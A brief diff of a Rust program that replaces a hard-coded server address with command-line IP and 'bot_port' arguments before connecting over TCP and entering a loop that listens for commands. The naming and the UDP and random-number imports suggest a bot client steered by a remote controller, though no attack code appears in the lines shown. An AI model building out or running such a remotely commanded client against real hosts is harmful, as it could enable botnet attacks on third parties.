@@ -4,13 +4,20 @@ use serde_json::{Value, from_str};
 use std::net::UdpSocket;
 use std::{time, thread};
 use rand::{thread_rng, Rng};
+use clap::Parser;
 
+#[derive(Parser)]
+struct Cli {
+    ip_addr: String,
+    bot_port: i32,
+}
 
 fn main() {
-    let server_addr = "127.0.0.1:6969"; // TODO: change
-    match TcpStream::connect(server_addr) {
+    let args = Cli::parse();
+    let target_host = format!("{}:{}", args.ip_addr.as_str(), args.bot_port);
+    match TcpStream::connect(&target_host) {
         Ok(mut stream) => {
-            println!("Successfully connected to server at {}", server_addr);
+            println!("Successfully connected to server at {}", target_host);
             
             // Main loop to listen for commands
             loop {
